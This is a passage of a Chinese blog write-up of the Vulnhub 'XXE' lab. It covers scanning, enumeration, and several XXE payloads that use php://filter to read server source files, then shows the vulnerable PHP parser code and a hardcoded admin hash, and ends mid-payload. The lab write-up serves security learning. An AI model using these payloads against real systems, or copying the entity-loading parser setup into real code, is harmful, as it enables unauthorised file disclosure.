{"title":"Vulnhub-XXE靶场","uid":"d6b5c98aeeb32013f5e3f6af5fdb7e80","slug":"Vulnhub-XXE靶场","date":"2022-06-05T14:38:38.000Z","updated":"2022-06-05T16:23:18.119Z","comments":true,"path":"api/articles/Vulnhub-XXE靶场.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>靶机地址：<a href=\"https://download.vulnhub.com/xxe/XXE.zip\">https://download.vulnhub.com/xxe/XXE.zip</a></p>\n<p>攻击机：Ninjitsu OS</p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p>打开靶机</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605224442188.png\" alt=\"image-20220605224442188\"></p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>查看攻击机ip地址：</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605224646224.png\" alt=\"image-20220605224646224\"></p>\n<p>使用nmap扫描网段，查找靶机ip：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nmap -sS 192.168.216.1&#x2F;24<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605225009097.png\" alt=\"image-20220605225009097\"></p>\n<p>扫描到靶机地址，并且开放80端口。</p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>使用浏览器打开其web页面：</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605225400312.png\" alt=\"image-20220605225400312\"></p>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>使用御剑扫描后台文件：<br><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605225716851.png\" alt=\"image-20220605225716851\"></p>\n<p>看到有robots.txt文件，访问robots.txt文件：<br><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605225842147.png\" alt=\"image-20220605225842147\"></p>\n<p>有&#x2F;xxe&#x2F;目录和admin.php文件。</p>\n<h2 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h2><p>访问&#x2F;xxe&#x2F;目录可以看到有登录框：</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605225952022.png\" alt=\"image-20220605225952022\"></p>\n<h2 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h2><p>随便输入账号密码抓包，可以看到是xml格式传输数据：</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605231147205.png\" alt=\"image-20220605231147205\"></p>\n<p>可以知道存在XXE漏洞。</p>\n<h2 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h2><p>插入攻击语句进行XXE注入：</p>\n<p>payload：利用php伪协议读取xxe.php文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxe.php&quot;&gt;\n]&gt;\n&lt;roo\n&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>注：</strong>注入时需要将<code>admin</code>更改为：<code>&amp;admin;</code>；并且<code>!ENTITY</code> 后需要和<code>&lt;name&gt;</code>标签处相同，为<code>admin</code>。</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605232505700.png\" alt=\"image-20220605232505700\"></p>\n<p>得到数据包为base64加密，拿去解密都得到：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">解密前：\nPD9waHAKbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwokeG1sZmlsZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpOwokZG9tID0gbmV3IERPTURvY3VtZW50KCk7CiRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKJGluZm8gPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKJG5hbWUgPSAkaW5mby0+bmFtZTsKJHBhc3N3b3JkID0gJGluZm8tPnBhc3N3b3JkOwoKZWNobyAiU29ycnksIHRoaXMgJG5hbWUgbm90IGF2YWlsYWJsZSEiOwo&#x2F;Pgo&#x3D;\n\n解密后：\n&lt;?php\nlibxml_disable_entity_loader (false);\n$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);\n$dom &#x3D; new DOMDocument();\n$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n$info &#x3D; simplexml_import_dom($dom);\n$name &#x3D; $info-&gt;name;\n$password &#x3D; $info-&gt;password;\necho &quot;Sorry, this $name not available!&quot;;\n?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>解密后为xxe.php的源代码：</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605233157806.png\" alt=\"image-20220605233157806\"></p>\n<h2 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h2><p>查看admin.php源代码：</p>\n<p>payload更改为admin.php：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;admin.php&quot;&gt;\n]&gt;\n&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得到admin.php的源码：</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605233304112.png\" alt=\"image-20220605233304112\"></p>\n<p>解密后源码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n   <span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n   \n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>admin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">href</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>css/bootstrap.min.css<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">rel</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      \n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n         <span class=\"token selector\">body</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">padding-top</span><span class=\"token punctuation\">:</span> 40px<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">padding-bottom</span><span class=\"token punctuation\">:</span> 40px<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span> #ADABAB<span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n         \n         <span class=\"token selector\">.form-signin</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">max-width</span><span class=\"token punctuation\">:</span> 330px<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 15px<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0 auto<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #017572<span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n         \n         <span class=\"token selector\">.form-signin .form-signin-heading,\n         .form-signin .checkbox</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">margin-bottom</span><span class=\"token punctuation\">:</span> 10px<span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n         \n         <span class=\"token selector\">.form-signin .checkbox</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">font-weight</span><span class=\"token punctuation\">:</span> normal<span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n         \n         <span class=\"token selector\">.form-signin .form-control</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> relative<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> auto<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">-webkit-box-sizing</span><span class=\"token punctuation\">:</span> border-box<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">-moz-box-sizing</span><span class=\"token punctuation\">:</span> border-box<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">box-sizing</span><span class=\"token punctuation\">:</span> border-box<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 10px<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 16px<span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n         \n         <span class=\"token selector\">.form-signin .form-control:focus</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">z-index</span><span class=\"token punctuation\">:</span> 2<span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n         \n         <span class=\"token selector\">.form-signin input[type=\"email\"]</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">margin-bottom</span><span class=\"token punctuation\">:</span> -1px<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">border-bottom-right-radius</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">border-bottom-left-radius</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">border-color</span><span class=\"token punctuation\">:</span>#017572<span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n         \n         <span class=\"token selector\">.form-signin input[type=\"password\"]</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">margin-bottom</span><span class=\"token punctuation\">:</span> 10px<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">border-top-left-radius</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">border-top-right-radius</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">border-color</span><span class=\"token punctuation\">:</span>#017572<span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n         \n         <span class=\"token selector\">h2</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span> center<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #017572<span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n      </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n      \n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n\t\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n      \n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>Enter Username and Password<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span> \n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>container form-signin<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n         \n         <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> \n               <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t\t\n               <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'administhebest'</span> <span class=\"token operator\">&amp;&amp;</span> \n                  <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'e6e061838856bf47e1de730719fb2609'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                  <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'valid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n                  <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'timeout'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                  <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'administhebest'</span><span class=\"token punctuation\">;</span>\n                  \n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You have entered valid use name and password &lt;br />\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Here is the &lt;a style='color:FF0000;' href='/flagmeout.php'>Flag&lt;/a>\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n               <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n                  <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'Maybe Later'</span><span class=\"token punctuation\">;</span>\n               <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n         <span class=\"token delimiter important\">?></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span> <span class=\"token comment\">&lt;!-- W00t/W00t --></span>\n      \n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>container<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      \n         <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">class</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>form-signin<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">role</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>form<span class=\"token punctuation\">\"</span></span> \n            <span class=\"token attr-name\">action</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n            <span class=\"token delimiter important\">?></span></span><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h4</span> <span class=\"token attr-name\">class</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>form-signin-heading<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h4</span><span class=\"token punctuation\">></span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>form-control<span class=\"token punctuation\">\"</span></span> \n               <span class=\"token attr-name\">name</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>username<span class=\"token punctuation\">\"</span></span> \n               <span class=\"token attr-name\">required</span> <span class=\"token attr-name\">autofocus</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>br</span><span class=\"token punctuation\">></span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>form-control<span class=\"token punctuation\">\"</span></span>\n               <span class=\"token attr-name\">name</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">required</span><span class=\"token punctuation\">></span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">class</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>btn btn-lg btn-primary btn-block<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> \n               <span class=\"token attr-name\">name</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>login<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Login<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span>\n         <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n\t\t\t\n         Click here to clean <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>adminlog.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">tite</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>Logout<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Session.\n         \n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span> \n      \n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>从源码中看到：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'administhebest'</span> <span class=\"token operator\">&amp;&amp;</span> \n                  <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'e6e061838856bf47e1de730719fb2609'</span><span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这里存放着用户名和密码，密码md5加密，拿去解密得到密码：</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605233558273.png\" alt=\"image-20220605233558273\"></p>\n<h2 id=\"0x09\"><a href=\"#0x09\" class=\"headerlink\" title=\"0x09\"></a>0x09</h2><p>登录：访问&#x2F;xxe&#x2F;admin.php进行登录。</p>\n<p><strong>注：上面获取的用户名和密码是从admin.php文件中获取的，因此登录也是在admin.php页面中，而不是&#x2F;xxe&#x2F;目录下的登录框。</strong></p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605234153158.png\" alt=\"image-20220605234153158\"></p>\n<p>点击login后出现<code>Here is the Flag</code>：</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605234206900.png\" alt=\"image-20220605234206900\"></p>\n<p>点击<code>Flag</code>跳转页面，并且找不到文件，观察url这时已经跳转到了根目录<br><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605234314167.png\" alt=\"image-20220605234314167\"></p>\n<h2 id=\"0x10\"><a href=\"#0x10\" class=\"headerlink\" title=\"0x10\"></a>0x10</h2><p>这里接着进行XXE注入，将根目录下的<code>flagmeout.php</code>文件源码读取出来：</p>\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flagmeout.php&quot;&gt;\n]&gt;\n&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>解密得到flag，发现flag内容被加密了：</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605234626424.png\" alt=\"image-20220605234626424\"></p>\n<p>这是base32加密，使用在线工具进行解密，解密得到base64：<br><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605234805730.png\" alt=\"image-20220605234805730\"></p>\n<p>接着解密得到flag.php文件的访问路径：</p>\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605234851356.png\" alt=\"image-20220605234851356\"></p>\n<h2 id=\"0x11\"><a href=\"#0x11\" class=\"headerlink\" title=\"0x11\"></a>0x11</h2><p>继续XXE注入查看flag.php源码：</p>\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY admin SYSTEM 